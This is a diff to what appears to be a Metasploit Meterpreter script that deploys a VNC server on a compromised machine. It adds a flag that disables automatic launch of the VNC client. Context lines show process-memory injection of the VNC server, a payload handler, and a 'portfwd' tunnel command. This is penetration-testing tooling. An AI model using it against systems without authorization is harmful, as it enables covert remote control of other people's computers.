@@ -16,6 +16,7 @@ opts = Rex::Parser::Arguments.new(
 	"-i"  => [ false,  "Inject the vnc server into a new process's memory instead of building an exe"],
 	"-P"  => [ true,   "Executable to inject into (starts a new process).  Only useful with -i (default: notepad.exe)"],
 	"-D"  => [ false,  "Disable the automatic multi/handler (use with -r to accept on another system)"],
+	"-V"  => [ false,  "Disable the automatic launch of the VNC client"],
 	"-t"  => [ false,  "Tunnel through the current session connection. (Will be slower)"],
 	"-c"  => [ false,  "Enable the VNC courtesy shell"]
 )
@@ -28,7 +29,9 @@ rhost    = Rex::Socket.source_address("1.2.3.4")
 rport    = 4545
 lhost    = "127.0.0.1"
 
+
 autoconn = true
+autovnc  = true
 courtesy = false
 tunnel   = false
 inject   = false
@@ -50,6 +53,8 @@ opts.parse(args) do |opt, idx, val|
 		runme = val
 	when "-D"
 		autoconn = false
+	when "-V"
+		autovnc = false
 	when "-c"
 		courtesy = true
 	when "-t"
@@ -91,6 +96,9 @@ if autoconn
 	if (not courtesy)
 		mul.datastore['DisableCourtesyShell'] = true
 	end
+
+	mul.datastore['AUTOVNC'] = autovnc
+
 	print_status("Running payload handler")
 	mul.exploit_simple(
 		'Payload'  => mul.datastore['PAYLOAD'],
@@ -140,5 +148,4 @@ if tunnel
 	print_status("Starting the port forwarding from #{rport} => TARGET:#{rport}")
 	client.run_cmd("portfwd add -L 127.0.0.1 -l #{rport} -p #{rport} -r #{lhost}")
 end
-
 
